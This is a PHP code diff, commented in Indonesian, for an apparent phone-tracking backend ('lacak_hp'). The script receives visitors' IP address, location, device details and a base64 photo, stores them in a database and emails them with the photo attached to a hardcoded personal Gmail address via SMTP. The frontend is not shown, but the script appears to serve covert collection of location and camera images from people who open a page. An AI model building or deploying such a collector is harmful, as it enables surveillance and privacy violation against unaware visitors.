@@ -1,4 +1,10 @@
 <?php
+require 'vendor/autoload.php'; // jika pakai Composer
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+// Data koneksi ke database
 $host = "localhost";
 $user = "root";
 $pass = "";
@@ -6,14 +12,15 @@ $db   = "lacak_hp";
 
 $conn = new mysqli($host, $user, $pass, $db);
 if ($conn->connect_error) {
-  die("Koneksi gagal: " . $conn->connect_error);
+    die("Koneksi gagal: " . $conn->connect_error);
 }
 
+// Ambil data dari request
 $data = json_decode(file_get_contents("php://input"), true);
-$ip     = $data['ip'] ?? '';
-$lokasi = $data['lokasi'] ?? '';
-$device = $data['device'] ?? '';
-$foto   = $data['foto'] ?? '';
+$ip      = $data['ip'] ?? '';
+$lokasi  = $data['lokasi'] ?? '';
+$device  = $data['device'] ?? '';
+$foto    = $data['foto'] ?? ''; // base64 image
 
 // Simpan ke database
 $stmt = $conn->prepare("INSERT INTO pengunjung (ip_address, lokasi, perangkat, foto) VALUES (?, ?, ?, ?)");
@@ -22,37 +29,44 @@ $stmt->execute();
 $stmt->close();
 $conn->close();
 
-// Kirim email
-$to       = "agatanuraini48@gmail.com"; // GANTI EMAIL TUJUAN
-$subject  = "Deteksi Perangkat Baru";
-$boundary = md5(uniqid());
-$filename = "foto_" . time() . ".png";
+// Siapkan data email
+$to_email = 'izanamiofnazi@gmail.com'; // Ganti dengan email tujuan
+$from_email = 'izanamiofnazi@gmail.com'; // Gmail kamu
+$from_name = 'Notifikasi Web';
+$subject = 'Deteksi Perangkat Baru';
 
-// Headers
-$headers  = "From: notifikasi@webmu.com\r\n";
-$headers .= "MIME-Version: 1.0\r\n";
-$headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";
+$mail = new PHPMailer(true);
 
-// Body Pesan
-$message  = "--$boundary\r\n";
-$message .= "Content-Type: text/plain; charset=UTF-8\r\n";
-$message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
-$message .= "IP Address : $ip\r\n";
-$message .= "Lokasi     : $lokasi\r\n";
-$message .= "Device     : $device\r\n\r\n";
+try {
+    // Konfigurasi SMTP Gmail
+    $mail->isSMTP();
+    $mail->Host = 'smtp.gmail.com';
+    $mail->SMTPAuth = true;
+    $mail->Username = $from_email; // Gmail kamu
+    $mail->Password = 'APLIKASI_PASSWORD'; // App password Gmail
+    $mail->SMTPSecure = 'tls';
+    $mail->Port = 587;
 
-// Lampiran Gambar
-$fotoData = str_replace('data:image/png;base64,', '', $foto);
-$fotoData = base64_decode($fotoData);
-$encodedFoto = chunk_split(base64_encode($fotoData));
+    // Set pengirim dan penerima
+    $mail->setFrom($from_email, $from_name);
+    $mail->addAddress($to_email);
 
-$message .= "--$boundary\r\n";
-$message .= "Content-Type: image/png; name=\"$filename\"\r\n";
-$message .= "Content-Transfer-Encoding: base64\r\n";
-$message .= "Content-Disposition: attachment; filename=\"$filename\"\r\n\r\n";
-$message .= $encodedFoto . "\r\n";
-$message .= "--$boundary--";
+    // Decode gambar base64
+    $cleanedData = str_replace('data:image/png;base64,', '', $foto);
+    $decodedImage = base64_decode($cleanedData);
+    $filename = 'foto_' . time() . '.png';
 
-// Kirim email
-mail($to, $subject, $message, $headers);
+    // Tambahkan lampiran
+    $mail->addStringAttachment($decodedImage, $filename, 'base64', 'image/png');
+
+    // Isi email
+    $body = "IP Address: $ip\nLokasi: $lokasi\nPerangkat: $device";
+    $mail->Subject = $subject;
+    $mail->Body    = $body;
+
+    $mail->send();
+    echo "Email berhasil dikirim.";
+} catch (Exception $e) {
+    echo "Gagal mengirim email. Error: {$mail->ErrorInfo}";
+}
 ?>
